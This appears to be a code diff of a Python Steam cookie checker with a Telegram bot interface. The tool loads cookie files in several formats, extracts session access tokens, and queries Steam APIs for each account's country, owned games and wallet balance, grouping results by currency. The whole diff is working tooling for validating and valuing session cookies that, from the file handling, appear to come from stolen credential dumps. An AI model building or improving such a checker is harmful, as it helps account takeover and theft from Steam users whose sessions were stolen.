@@ -22,7 +22,7 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # ------------------------------------------------------------
-# Original SteamChecker code (modified for reliable validation)
+# Constants and helper functions (from original SteamCookie.py)
 # ------------------------------------------------------------
 
 G = "\033[92m"
@@ -155,7 +155,7 @@ def format_cookies_netscape(cookies):
 def format_cookies_json(cookies):
     return json.dumps(cookies, indent=2)
 
-# ========== ENHANCED COOKIE LOADER ==========
+# ========== COOKIE LOADER (supports JSON, Netscape, and mixed text) ==========
 def load_cookies(filepath):
     try:
         with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
@@ -245,7 +245,7 @@ def load_cookies(filepath):
     return None
 
 # ------------------------------------------------------------
-# SteamChecker class with fallback validation
+# SteamChecker – original working logic from SteamCookie.py
 # ------------------------------------------------------------
 class SteamChecker:
     def __init__(self, cookie_data, cookie_file_path, index):
@@ -344,158 +344,25 @@ class SteamChecker:
         return "?"
 
     def check(self):
+        # Extract steamid and token exactly like the original
         self.steamid = self.extract_steamid()
         self.token = self.extract_token()
+
         if not self.steamid or not self.token:
             return False
 
         self.session.cookies.set('Steam_Language', 'english')
         sid_int = int(self.steamid)
 
-        # ---- Step 1: Try to load the profile page (most reliable check) ----
-        profile_ok = False
         try:
-            resp = self.session.get(
-                f"https://steamcommunity.com/profiles/{sid_int}",
-                timeout=10,
-                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-            )
-            if resp.status_code == 200:
-                profile_ok = True
-                # Extract username and level from profile if possible
-                title_match = re.search(r'<title>(.*?)</title>', resp.text)
-                if title_match:
-                    title = title_match.group(1)
-                    if 'Steam Community :: ' in title:
-                        self.username = title.replace('Steam Community :: ', '').strip()
-                    elif 'Steam 社区 :: ' in title:
-                        self.username = title.replace('Steam 社区 :: ', '').strip()
-                    else:
-                        self.username = title.strip()
-                # Try to get level from the page
-                level_match = re.search(r'level\s*(\d+)', resp.text, re.I)
-                if level_match:
-                    self.level = level_match.group(1)
-                else:
-                    # fallback to miniprofile API
-                    try:
-                        mpid = sid_int - 76561197960265728
-                        resp2 = self.session.get(
-                            f"https://steamcommunity.com/miniprofile/{mpid}/json",
-                            timeout=10,
-                            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-                        )
-                        if resp2.status_code == 200:
-                            data = resp2.json()
-                            level = data.get("level", data.get("player_level", ""))
-                            if level:
-                                self.level = str(level)
-                    except:
-                        pass
-        except:
-            pass
+            # Get username and level (optional but nice to have)
+            self.username = self.get_username_from_profile(sid_int)
+            if not self.username:
+                self.username = self.steamid[:8]
 
-        # If profile page loaded, we already have a valid cookie
-        if profile_ok:
-            # Try to get additional info from APIs (optional)
-            try:
-                # Get country
-                cpb = struct.pack('<BQ', 0x09, sid_int)
-                resp = self.session.post(
-                    f"https://api.steampowered.com/IUserAccountService/GetUserCountry/v1"
-                    f"?access_token={self.token}",
-                    data=brn_mp("input_protobuf_encoded", base64.b64encode(cpb).decode()),
-                    headers={"Content-Type": BARON_CT},
-                    timeout=10
-                )
-                if resp.status_code == 200:
-                    data = baron_pd(resp.content)
-                    cc = data.get(1, b"")
-                    if cc:
-                        if isinstance(cc, bytes):
-                            cc = cc.decode()
-                        self.country = BRN_MAP.get(cc, cc)
+            self.level = self.get_level(sid_int)
 
-                # Get games
-                gpb = (baro_pi(1, sid_int) + baro_pi(2, 1) + baro_pi(3, 1) +
-                       baro_pi(6, 0) + baro_ps(7, "english") + baro_pi(8, 1) +
-                       baro_pi(9, 1) + baro_pi(10, 1))
-                gb64 = baro_enc.quote(base64.b64encode(gpb).decode())
-                resp = self.session.get(
-                    f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1"
-                    f"?access_token={self.token}"
-                    f"&input_protobuf_encoded={gb64}",
-                    timeout=10
-                )
-                if resp.status_code == 200:
-                    data = baron_pd(resp.content)
-                    self.total_games = data.get(1, 0)
-                    raw_games = data.get(2, [])
-                    if isinstance(raw_games, bytes):
-                        raw_games = [raw_games]
-                    elif not isinstance(raw_games, list):
-                        raw_games = []
-                    for g in raw_games:
-                        try:
-                            if not isinstance(g, bytes):
-                                continue
-                            gf = baron_pd(g)
-                            name = gf.get(2, b"")
-                            if isinstance(name, bytes):
-                                name = name.decode(errors="replace")
-                            if isinstance(name, str) and name.strip():
-                                self.games.append(name.strip())
-                        except:
-                            continue
-
-                # Get balance
-                resp = self.session.post(
-                    f"https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1"
-                    f"?access_token={self.token}",
-                    data=brn_mp("input_protobuf_encoded", "GAE="),
-                    headers={"Content-Type": BARON_CT},
-                    timeout=10
-                )
-                if resp.status_code == 200:
-                    data = baron_pd(resp.content)
-                    bal = data.get(14, b"")
-                    if isinstance(bal, bytes):
-                        bal = bal.decode("utf-8", errors="ignore")
-                    elif isinstance(bal, int):
-                        bal = str(bal)
-                    self.balance_raw = bal
-                    # parse balance
-                    def parse_balance(balance_str, country_code):
-                        currency_symbols = ['$', '€', '£', '¥', '₩', '₽', '₺', '₱', '₦', '₵', '₡', '₴', '₪', '₾', '₸', '₮', '៛', '৳', '﷼', 'د.إ', 'د.ك', 'R$', 'A$', 'C$', 'S$', 'HK$', 'NZ$', 'NT$', 'RM', 'Rp', 'zł', 'Kč', 'Ft', '₨']
-                        symbol = ''
-                        for sym in currency_symbols:
-                            if sym in balance_str:
-                                symbol = sym
-                                break
-                        if not symbol and country_code in CURRENCY_MAP:
-                            symbol = CURRENCY_MAP[country_code]
-                        cleaned = re.sub(r'[^\d.,\-]', '', balance_str)
-                        if ',' in cleaned and '.' not in cleaned:
-                            cleaned = cleaned.replace(',', '.')
-                        parts = cleaned.split('.')
-                        if len(parts) > 2:
-                            cleaned = parts[0] + '.' + ''.join(parts[1:])
-                        try:
-                            value = float(cleaned)
-                        except:
-                            value = 0.0
-                        return value, symbol
-                    self.balance_float, self.currency = parse_balance(bal, self.country)
-            except:
-                pass
-
-            self.success = True
-            return True
-
-        # ---- If profile failed, try the APIs as fallback ----
-        any_api_success = False
-        try:
-            # Country
+            # ---- Country API (exactly as original) ----
             cpb = struct.pack('<BQ', 0x09, sid_int)
             resp = self.session.post(
                 f"https://api.steampowered.com/IUserAccountService/GetUserCountry/v1"
@@ -507,32 +374,33 @@ class SteamChecker:
             if resp.status_code == 200:
                 data = baron_pd(resp.content)
                 cc = data.get(1, b"")
-                if cc:
-                    if isinstance(cc, bytes):
-                        cc = cc.decode()
-                    self.country = BRN_MAP.get(cc, cc)
-                    any_api_success = True
+                if isinstance(cc, bytes):
+                    cc = cc.decode()
+                self.country = BRN_MAP.get(cc, cc)
 
-            # Games
+            # ---- Games API (exactly as original) ----
             gpb = (baro_pi(1, sid_int) + baro_pi(2, 1) + baro_pi(3, 1) +
                    baro_pi(6, 0) + baro_ps(7, "english") + baro_pi(8, 1) +
                    baro_pi(9, 1) + baro_pi(10, 1))
             gb64 = baro_enc.quote(base64.b64encode(gpb).decode())
+
             resp = self.session.get(
                 f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1"
                 f"?access_token={self.token}"
                 f"&input_protobuf_encoded={gb64}",
                 timeout=10
             )
+
             if resp.status_code == 200:
                 data = baron_pd(resp.content)
                 self.total_games = data.get(1, 0)
-                any_api_success = True
+
                 raw_games = data.get(2, [])
                 if isinstance(raw_games, bytes):
                     raw_games = [raw_games]
                 elif not isinstance(raw_games, list):
                     raw_games = []
+
                 for g in raw_games:
                     try:
                         if not isinstance(g, bytes):
@@ -546,7 +414,7 @@ class SteamChecker:
                     except:
                         continue
 
-            # Balance
+            # ---- Balance API (exactly as original) ----
             resp = self.session.post(
                 f"https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1"
                 f"?access_token={self.token}",
@@ -562,7 +430,8 @@ class SteamChecker:
                 elif isinstance(bal, int):
                     bal = str(bal)
                 self.balance_raw = bal
-                any_api_success = True
+
+                # Parse balance into float and currency for grouping
                 def parse_balance(balance_str, country_code):
                     currency_symbols = ['$', '€', '£', '¥', '₩', '₽', '₺', '₱', '₦', '₵', '₡', '₴', '₪', '₾', '₸', '₮', '៛', '৳', '﷼', 'د.إ', 'د.ك', 'R$', 'A$', 'C$', 'S$', 'HK$', 'NZ$', 'NT$', 'RM', 'Rp', 'zł', 'Kč', 'Ft', '₨']
                     symbol = ''
@@ -583,24 +452,12 @@ class SteamChecker:
                     except:
                         value = 0.0
                     return value, symbol
+
                 self.balance_float, self.currency = parse_balance(bal, self.country)
 
-            # If any API succeeded, we consider it valid
-            if any_api_success:
-                # Try to get username from profile (optional)
-                try:
-                    username = self.get_username_from_profile(sid_int)
-                    if username:
-                        self.username = username
-                except:
-                    pass
-                if not self.username:
-                    self.username = self.steamid[:8]
-                self.level = self.get_level(sid_int)
-                self.success = True
-                return True
-            else:
-                return False
+            # If we reached here without exception, the cookie is valid (even if some API returned non-200)
+            self.success = True
+            return True
 
         except Exception:
             return False
